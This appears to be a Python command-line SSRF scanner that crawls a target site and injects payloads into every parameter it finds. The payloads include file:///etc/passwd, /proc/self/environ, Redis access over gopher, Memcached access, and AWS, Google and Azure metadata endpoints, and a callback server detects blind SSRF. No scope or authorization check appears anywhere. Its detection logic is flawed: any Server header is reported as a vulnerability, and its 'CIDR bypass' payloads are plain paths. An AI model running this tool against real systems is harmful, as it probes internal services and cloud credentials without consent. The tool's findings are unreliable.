#!/usr/bin/env python3
"""
Advanced SSRF Vulnerability Scanner
-----------------------------------
A comprehensive tool for detecting Server-Side Request Forgery vulnerabilities in web applications.
"""

import argparse
import asyncio
import aiohttp
import random
import re
import sys
import time
import urllib.parse
from typing import List, Dict, Set, Tuple, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import ipaddress
import socket
import ssl
import json
import logging
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('ssrf_scan.log')
    ]
)
logger = logging.getLogger('ssrf_scanner')

VERSION = "1.0.0"

# ANSI color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


@dataclass
class SsrfPayload:
    payload: str
    description: str
    severity: str  # 'Low', 'Medium', 'High', 'Critical'
    callback_required: bool = False


@dataclass
class SsrfVulnerability:
    url: str
    parameter: str
    payload: SsrfPayload
    response_data: str
    status_code: int
    response_time: float
    request_headers: Dict[str, str]
    response_headers: Dict[str, str]
    evidence: str


class CallbackServer:
    """HTTP callback server to detect blind SSRF vulnerabilities"""
    
    def __init__(self, host='0.0.0.0', port=8000):
        self.host = host
        self.port = port
        self.received_callbacks = set()
        self.running = False
        self.app = None
        self.server = None
        self.external_ip = None
        
    async def start_server(self):
        from aiohttp import web
        
        self.app = web.Application()
        self.app.add_routes([web.get('/{token}', self.handle_callback)])
        
        runner = web.AppRunner(self.app)
        await runner.setup()
        self.server = web.TCPSite(runner, self.host, self.port)
        await self.server.start()
        self.running = True
        
        # Try to get external IP for the callback URL
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.ipify.org') as response:
                    if response.status == 200:
                        self.external_ip = await response.text()
        except Exception as e:
            logger.warning(f"Could not determine external IP: {e}")
            self.external_ip = self.host if self.host != '0.0.0.0' else '127.0.0.1'
            
        logger.info(f"Callback server started on http://{self.external_ip}:{self.port}")
        return self
        
    async def handle_callback(self, request):
        from aiohttp import web
        
        token = request.match_info['token']
        headers = dict(request.headers)
        query_params = dict(request.query)
        
        callback_data = {
            'token': token,
            'headers': headers,
            'query_params': query_params,
            'remote': request.remote,
            'time': time.time()
        }
        
        self.received_callbacks.add(token)
        logger.info(f"Received callback for token: {token}")
        
        return web.Response(text="OK")
    
    def get_callback_url(self, token):
        """Generate a callback URL with the given token"""
        return f"http://{self.external_ip}:{self.port}/{token}"
    
    def has_received_callback(self, token):
        """Check if a callback was received for the given token"""
        return token in self.received_callbacks
    
    async def stop_server(self):
        """Stop the callback server"""
        if self.server:
            await self.server.stop()
            self.running = False
            logger.info("Callback server stopped")


class SsrfScanner:
    """Advanced SSRF vulnerability scanner"""
    
    def __init__(self, target_url, callback_server=None, concurrency=10, 
                 timeout=10, delay=0, cookies=None, headers=None, 
                 follow_redirects=True, proxy=None, verify_ssl=True,
                 user_agent=None, scan_depth=2, output_file=None):
        
        self.target_url = target_url
        self.base_url = self._get_base_url(target_url)
        self.callback_server = callback_server
        self.concurrency = concurrency
        self.timeout = timeout
        self.delay = delay
        self.follow_redirects = follow_redirects
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.scan_depth = scan_depth
        self.output_file = output_file
        
        # Initialize user_agent with a reasonable default if none provided
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
        
        # Initialize headers and cookies
        self.headers = headers or {}
        if 'User-Agent' not in self.headers:
            self.headers['User-Agent'] = self.user_agent
            
        self.cookies = cookies or {}
        
        # URLs that have been scanned or are queued for scanning
        self.visited_urls = set()
        self.urls_to_scan = set([target_url])
        
        # Parameters found across all scanned pages
        self.parameters = {}  # URL -> list of parameters
        
        # Vulnerabilities found
        self.vulnerabilities = []
        
        # Rate limiting
        self.rate_limit = asyncio.Semaphore(concurrency)
        
        # Payloads for testing
        self.payloads = self._generate_payloads()
        
        # Session for making requests
        self.session = None
        
    def _get_base_url(self, url):
        """Extract the base URL from the target URL"""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def _generate_payloads(self):
        """Generate a list of payloads for SSRF testing"""
        payloads = []
        
        # Local network payloads
        payloads.append(SsrfPayload("http://127.0.0.1", "Basic localhost access", "Medium"))
        payloads.append(SsrfPayload("http://localhost", "Basic localhost access", "Medium"))
        payloads.append(SsrfPayload("http://127.0.0.1:22", "SSH port access", "High"))
        payloads.append(SsrfPayload("http://127.0.0.1:3306", "MySQL access", "High"))
        
        # IP Obfuscation payloads
        payloads.append(SsrfPayload("http://0", "IP zero representation", "Medium"))
        payloads.append(SsrfPayload("http://0.0.0.0", "Alternative IP format", "Medium"))
        payloads.append(SsrfPayload("http://0177.0.0.1", "Octal IP representation", "Medium"))
        payloads.append(SsrfPayload("http://2130706433", "Decimal IP representation", "Medium"))
        payloads.append(SsrfPayload("http://0x7f.0.0.1", "Hexadecimal IP representation", "Medium"))
        
        # CIDR bypass payloads
        for i in range(8, 32):
            payloads.append(SsrfPayload(f"http://127.0.0.1/{i}", f"CIDR bypass with /{i}", "High"))
        
        # Protocol exploitation payloads
        payloads.append(SsrfPayload("file:///etc/passwd", "Local file inclusion", "Critical"))
        payloads.append(SsrfPayload("file:///proc/self/environ", "Process environment access", "Critical"))
        payloads.append(SsrfPayload("dict://localhost:11211/stat", "Memcached access", "Critical"))
        payloads.append(SsrfPayload("gopher://localhost:6379/_INFO", "Redis access via Gopher", "Critical"))
        
        # DNS rebinding payloads
        payloads.append(SsrfPayload("http://attacker-controlled-dns.com", "DNS rebinding attack", "High"))
        
        # Cloud metadata payloads
        payloads.append(SsrfPayload("http://169.254.169.254/latest/meta-data/", "AWS metadata service", "Critical"))
        payloads.append(SsrfPayload("http://metadata.google.internal/computeMetadata/v1/", "Google Cloud metadata", "Critical"))
        payloads.append(SsrfPayload("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata", "Critical"))
        payloads.append(SsrfPayload("http://169.254.169.254/metadata/instance", "Azure metadata service", "Critical"))
        
        # Localhost variants
        local_variants = [
            "localhost", "127.0.0.1", "127.0.1", "127.1", "0", "0.0.0.0", 
            "127.127.127.127", "127.0.0.2", "localhost.localdomain", "127.0.0.1.nip.io",
            "[::1]", "[0:0:0:0:0:0:0:1]", "[::ffff:127.0.0.1]"
        ]
        for variant in local_variants:
            payloads.append(SsrfPayload(f"http://{variant}", f"Localhost variant: {variant}", "Medium"))
        
        # URL encoding bypass payloads
        encoded_localhost = urllib.parse.quote("localhost")
        double_encoded = urllib.parse.quote(encoded_localhost)
        payloads.append(SsrfPayload(f"http://{encoded_localhost}", "URL encoded localhost", "Medium"))
        payloads.append(SsrfPayload(f"http://{double_encoded}", "Double URL encoded localhost", "Medium"))
        
        # Add callback payloads if a callback server is available
        if self.callback_server:
            for i in range(5):
                token = f"token{random.randint(10000, 99999)}"
                callback_url = self.callback_server.get_callback_url(token)
                payloads.append(SsrfPayload(callback_url, f"Callback detection with token {token}", "High", True))
        
        return payloads
    
    async def start_scan(self):
        """Start the SSRF scanning process"""
        logger.info(f"{Colors.HEADER}Starting SSRF scan against {self.target_url}{Colors.ENDC}")
        logger.info(f"Scan configuration: concurrency={self.concurrency}, timeout={self.timeout}s, scan_depth={self.scan_depth}")
        
        start_time = time.time()
        
        # Create client session
        self.session = aiohttp.ClientSession(
            cookies=self.cookies,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers=self.headers,
            trust_env=True
        )
        
        try:
            # Crawl the target site up to the specified depth
            await self.crawl_site()
            
            # Test all found parameters for SSRF
            await self.test_parameters()
            
            # Save results
            if self.output_file:
                self.save_results()
            
            # Print scan summary
            self.print_summary(time.time() - start_time)
            
        finally:
            # Cleanup
            await self.session.close()
    
    async def crawl_site(self):
        """Crawl the target site to discover pages and parameters"""
        logger.info(f"Crawling site: {self.target_url} (depth: {self.scan_depth})")
        
        current_depth = 0
        while current_depth < self.scan_depth and self.urls_to_scan:
            current_urls = list(self.urls_to_scan)
            self.urls_to_scan = set()
            
            # Process current level URLs
            tasks = []
            for url in current_urls:
                if url in self.visited_urls:
                    continue
                
                self.visited_urls.add(url)
                tasks.append(self.process_url(url))
            
            if tasks:
                await asyncio.gather(*tasks)
            
            current_depth += 1
        
        logger.info(f"Crawling completed: {len(self.visited_urls)} URLs discovered")
    
    async def process_url(self, url):
        """Process a single URL: extract parameters, find links for crawling"""
        async with self.rate_limit:
            await asyncio.sleep(self.delay)  # Respect delay between requests
            
            try:
                logger.debug(f"Scanning URL: {url}")
                
                async with self.session.get(
                    url, 
                    allow_redirects=self.follow_redirects,
                    ssl=None if not self.verify_ssl else ssl.create_default_context(),
                    proxy=self.proxy
                ) as response:
                    
                    content_type = response.headers.get('Content-Type', '')
                    if 'text/html' in content_type:
                        body = await response.text()
                        
                        # Extract parameters from forms
                        await self.extract_parameters_from_page(url, body)
                        
                        # Extract links for further crawling
                        await self.extract_links_from_page(url, body)
                    
                    # Also check URL parameters
                    parsed_url = urlparse(url)
                    if parsed_url.query:
                        params = urllib.parse.parse_qs(parsed_url.query)
                        if url not in self.parameters:
                            self.parameters[url] = []
                        for param in params.keys():
                            param_info = {
                                'name': param,
                                'type': 'url',
                                'method': 'GET'
                            }
                            if param_info not in self.parameters[url]:
                                self.parameters[url].append(param_info)
            
            except aiohttp.ClientError as e:
                logger.warning(f"Error accessing {url}: {str(e)}")
            except Exception as e:
                logger.error(f"Unexpected error processing {url}: {str(e)}")
    
    async def extract_parameters_from_page(self, url, html_content):
        """Extract form parameters from HTML page"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Process forms
            for form in soup.find_all('form'):
                method = form.get('method', 'GET').upper()
                action = form.get('action')
                
                # Resolve action URL
                if action:
                    if action.startswith('http'):
                        form_url = action
                    else:
                        form_url = urljoin(url, action)
                else:
                    form_url = url
                
                # Initialize parameter list for this URL
                if form_url not in self.parameters:
                    self.parameters[form_url] = []
                
                # Extract form inputs
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_field.get('name')
                    if input_name:
                        param_info = {
                            'name': input_name,
                            'type': 'form',
                            'method': method
                        }
                        if param_info not in self.parameters[form_url]:
                            self.parameters[form_url].append(param_info)
        
        except Exception as e:
            logger.error(f"Error extracting parameters from {url}: {str(e)}")
    
    async def extract_links_from_page(self, url, html_content):
        """Extract links from HTML page for further crawling"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                
                # Skip empty links, anchors, javascript, etc.
                if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                    continue
                
                # Resolve relative URLs
                if not href.startswith(('http://', 'https://')):
                    href = urljoin(url, href)
                
                # Only follow links within the same domain
                if urlparse(href).netloc == urlparse(self.base_url).netloc:
                    if href not in self.visited_urls:
                        self.urls_to_scan.add(href)
        
        except Exception as e:
            logger.error(f"Error extracting links from {url}: {str(e)}")
    
    async def test_parameters(self):
        """Test all discovered parameters for SSRF vulnerabilities"""
        logger.info(f"Testing {sum(len(params) for params in self.parameters.values())} parameters for SSRF vulnerabilities")
        
        tasks = []
        for url, params in self.parameters.items():
            for param_info in params:
                tasks.append(self.test_parameter(url, param_info))
        
        if tasks:
            await asyncio.gather(*tasks)
    
    async def test_parameter(self, url, param_info):
        """Test a single parameter for SSRF vulnerabilities"""
        param_name = param_info['name']
        method = param_info['method']
        param_type = param_info['type']
        
        logger.debug(f"Testing parameter {param_name} in {url} ({method})")
        
        for payload in self.payloads:
            # Skip callback payloads if no callback server is available
            if payload.callback_required and not self.callback_server:
                continue
            
            token = None
            if payload.callback_required:
                # Extract token from callback URL
                token = urlparse(payload.payload).path.strip('/')
            
            try:
                async with self.rate_limit:
                    await asyncio.sleep(self.delay)
                    
                    start_time = time.time()
                    status_code, response_data, response_headers = await self._send_request(
                        url, param_name, payload.payload, method, param_type
                    )
                    response_time = time.time() - start_time
                    
                    # Check for direct evidence of vulnerability
                    is_vulnerable, evidence = self._check_vulnerability(
                        response_data, response_headers, payload
                    )
                    
                    # Check for callback evidence if applicable
                    if payload.callback_required and token and self.callback_server.has_received_callback(token):
                        is_vulnerable = True
                        evidence = f"Callback received for token: {token}"
                    
                    if is_vulnerable:
                        vulnerability = SsrfVulnerability(
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response_data=response_data[:1000],  # Limit the size
                            status_code=status_code,
                            response_time=response_time,
                            request_headers=self.headers,
                            response_headers=dict(response_headers),
                            evidence=evidence
                        )
                        self.vulnerabilities.append(vulnerability)
                        logger.warning(
                            f"{Colors.RED}SSRF vulnerability found:{Colors.ENDC} {url} "
                            f"({param_name}={payload.payload}) - {evidence}"
                        )
            
            except Exception as e:
                logger.error(f"Error testing {param_name} in {url} with {payload.payload}: {str(e)}")
    
    async def _send_request(self, url, param_name, payload, method, param_type):
        """Send a request with the SSRF payload"""
        if method == 'GET':
            if param_type == 'url':
                # Modify URL parameter
                parsed_url = list(urlparse(url))
                query_params = urllib.parse.parse_qs(parsed_url[4])
                query_params[param_name] = [payload]
                parsed_url[4] = urllib.parse.urlencode(query_params, doseq=True)
                modified_url = urllib.parse.urlunparse(parsed_url)
                
                async with self.session.get(
                    modified_url,
                    allow_redirects=self.follow_redirects,
                    ssl=None if not self.verify_ssl else ssl.create_default_context(),
                    proxy=self.proxy
                ) as response:
                    return response.status, await response.text(), response.headers
            
            elif param_type == 'form':
                # Submit form with GET method
                params = {param_name: payload}
                async with self.session.get(
                    url,
                    params=params,
                    allow_redirects=self.follow_redirects,
                    ssl=None if not self.verify_ssl else ssl.create_default_context(),
                    proxy=self.proxy
                ) as response:
                    return response.status, await response.text(), response.headers
        
        elif method == 'POST':
            # Submit form with POST method
            data = {param_name: payload}
            headers = dict(self.headers)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            async with self.session.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=self.follow_redirects,
                ssl=None if not self.verify_ssl else ssl.create_default_context(),
                proxy=self.proxy
            ) as response:
                return response.status, await response.text(), response.headers
        
        return None, "", {}
    
    def _check_vulnerability(self, response_data, response_headers, payload):
        """Check if the response indicates a successful SSRF"""
        # Common evidence patterns
        evidence_patterns = {
            # File access patterns
            r"root:.*:0:0:": "Local file content exposed - /etc/passwd",
            r"nobody:.*:99:99": "Local file content exposed - /etc/passwd",
            
            # Common error messages that indicate SSRF
            r"failed to connect to \d+\.\d+\.\d+\.\d+ port \d+": "Connection error message exposed",
            r"ConnectionRefused": "Connection error exposed",
            r"connection refused": "Connection error exposed",
            r"Network is unreachable": "Network error exposed",
            
            # AWS metadata patterns
            r"ami-id|instance-id|instance-type": "Cloud metadata exposed",
            r"metadata\.google\.internal": "Google Cloud metadata reference",
            
            # Internal service responses
            r"<\?xml version": "XML response from internal service",
            r"redis_version": "Redis information exposed",
            r"STORED|VALUE|ERROR": "Memcached response",
            
            # HTTP proxy responses
            r"Host: localhost": "HTTP proxy response"
        }
        
        # Check if response contains any evidence patterns
        for pattern, evidence_msg in evidence_patterns.items():
            if re.search(pattern, response_data, re.IGNORECASE):
                return True, evidence_msg
        
        # Check response headers for evidence
        header_patterns = {
            "X-Powered-By": "Internal server header exposed",
            "Server": "Internal server header exposed"
        }
        
        for header, evidence_msg in header_patterns.items():
            if header.lower() in [h.lower() for h in response_headers]:
                return True, evidence_msg
        
        # Check for reflections of the payload in the response
        if payload.payload in response_data:
            return True, f"Payload reflection: {payload.payload}"
        
        return False, ""
    
    def save_results(self):
        """Save scan results to file"""
        try:
            results = {
                "target_url": self.target_url,
                "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "urls_scanned": len(self.visited_urls),
                "parameters_tested": sum(len(params) for params in self.parameters.values()),
                "vulnerabilities_found": len(self.vulnerabilities),
                "vulnerabilities": [
                    {
                        "url": vuln.url,
                        "parameter": vuln.parameter,
                        "payload": vuln.payload.payload,
                        "description": vuln.payload.description,
                        "severity": vuln.payload.severity,
                        "evidence": vuln.evidence,
                        "status_code": vuln.status_code
                    } for vuln in self.vulnerabilities
                ]
            }
            
            with open(self.output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            logger.info(f"Results saved to {self.output_file}")
        
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")
    
    def print_summary(self, elapsed_time):
        """Print scan summary"""
        print("\n" + "="*60)
        print(f"{Colors.BOLD}{Colors.HEADER}SSRF Scan Summary{Colors.ENDC}")
        print("="*60)
        print(f"Target URL: {self.target_url}")
        print(f"Scan Duration: {elapsed_time:.2f} seconds")
        print(f"URLs Scanned: {len(self.visited_urls)}")
        print(f"Parameters Tested: {sum(len(params) for params in self.parameters.values())}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        print("="*60)
        
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}Vulnerabilities by Severity:{Colors.ENDC}")
            severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
            
            for vuln in self.vulnerabilities:
                severity_counts[vuln.payload.severity] += 1
            
            for severity, count in severity_counts.items():
                color = Colors.RED if severity in ["Critical", "High"] else Colors.YELLOW
                if severity == "Low":
                    color = Colors.GREEN
                
                print(f"{color}{severity}: {count}{Colors.ENDC}")
            
            print("\n" + "-"*60)
            print(f"{Colors.BOLD}Top Vulnerable Endpoints:{Colors.ENDC}")
            
            # Group vulnerabilities by URL
            url_vulns = {}
            for vuln in self.vulnerabilities:
                if vuln.url not in url_vulns:
                    url_vulns[vuln.url] = []
                url_vulns[vuln.url].append(vuln)
            
            # Display top 5 vulnerable URLs
            for i, (url, vulns) in enumerate(sorted(url_vulns.items(), key=lambda x: len(x[1]), reverse=True)[:5]):
                print(f"{i+1}. {url} - {len(vulns)} vulnerabilities")
                for vuln in vulns[:3]:  # Show first 3 vulns per URL
                    color = Colors.RED if vuln.payload.severity in ["Critical", "High"] else Colors.YELLOW
                    print(f"   {color}[{vuln.payload.severity}]{Colors.ENDC} {vuln.parameter} - {vuln.payload.description}")
                if len(vulns) > 3:
                    print(f"   ... and {len(vulns) - 3} more")
        
        if self.output_file:
            print(f"\nDetailed results saved to: {self.output_file}")


async def main():
    """Main function to parse arguments and run the scanner"""
    parser = argparse.ArgumentParser(description="Advanced SSRF Vulnerability Scanner")
    
    # Required arguments
    parser.add_argument("target", help="Target URL to scan")
    
    # Scanner configuration
    parser.add_argument("-o", "--output", help="Output file for results (JSON)")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--depth", type=int, default=2, help="Crawling depth")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL verification")
    parser.add_argument("--no-redirect", action="store_true", help="Don't follow redirects")
    
    # Callback server options
    parser.add_argument("--callback", action="store_true", help="Enable callback server for blind SSRF detection")
    parser.add_argument("--callback-host", default="0.0.0.0", help="Host for callback server")
    parser.add_argument("--callback-port", type=int, default=8000, help="Port for callback server")
    
    # Authentication options
    parser.add_argument("--cookies", help="Cookies to include with requests (format: name1=value1;name2=value2)")
    parser.add_argument("--user-agent", help="User-Agent string to use")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    
    # Parse arguments
    args = parser.parse_args()
    
    # Process cookies if provided
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            try:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
            except ValueError:
                logger.warning(f"Invalid cookie format: {cookie}")
    
    # Headers
    headers = {}
    if args.user_agent:
        headers['User-Agent'] = args.user_agent
    
    # Setup callback server if enabled
    callback_server = None
    if args.callback:
        callback_server = CallbackServer(args.callback_host, args.callback_port)
        await callback_server.start_server()
    
    try:
        # Print banner
        print(f"""
{Colors.HEADER}{Colors.BOLD}

\___ \\___ \|  _ <|  _  / \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 ____) |___) | |_) | | \ \ ____) | (_| (_| | | | | | | |  __/ |   
|_____/_____/|____/|_|  \_\_____/ \___\__,_|_| |_|_| |_|\___|_|   
                                                                  
{Colors.ENDC}
Advanced SSRF Vulnerability Scanner v{VERSION}
""")
        
        # Create and run scanner
        scanner = SsrfScanner(
            target_url=args.target,
            callback_server=callback_server,
            concurrency=args.concurrency,
            timeout=args.timeout,
            delay=args.delay,
            cookies=cookies,
            headers=headers,
            follow_redirects=not args.no_redirect,
            proxy=args.proxy,
            verify_ssl=not args.no_verify_ssl,
            user_agent=args.user_agent,
            scan_depth=args.depth,
            output_file=args.output
        )
        
        await scanner.start_scan()
    
    finally:
        # Stop callback server if it was started
        if callback_server and callback_server.running:
            await callback_server.stop_server()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)